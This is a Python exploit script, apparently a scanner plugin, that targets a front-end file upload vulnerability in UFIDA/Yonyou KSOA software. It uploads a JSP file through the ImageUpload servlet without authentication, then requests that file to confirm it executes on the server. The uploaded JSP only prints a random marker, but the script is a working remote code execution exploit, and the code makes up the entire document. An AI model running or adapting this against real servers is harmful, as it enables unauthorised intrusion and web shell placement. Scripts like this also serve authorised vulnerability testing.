import requests
import re, time
import urllib, random, string

def verify(url):
    result = {
        'name': 'UFIDA 用友时空KSOA软件 前台文件上传漏洞(2022HVV)',
        'vulnerable': False
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    payload = '/servlet/com.sksoft.bill.ImageUpload?filepath=/&filename=test.jsp'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
    }
    vurl = urllib.parse.urljoin(url, payload)
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=shell, verify=False)
        if rep.status_code == 200:
            return_path = re.search('(?<=<root>).*(?=</root>)', rep.text).group(0)
            verify_url = urllib.parse.urljoin(url, return_path)
            time.sleep(1)
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                result['vulnerable'] = True
                result['verify'] = verify_url
        return result
    except:
        return result
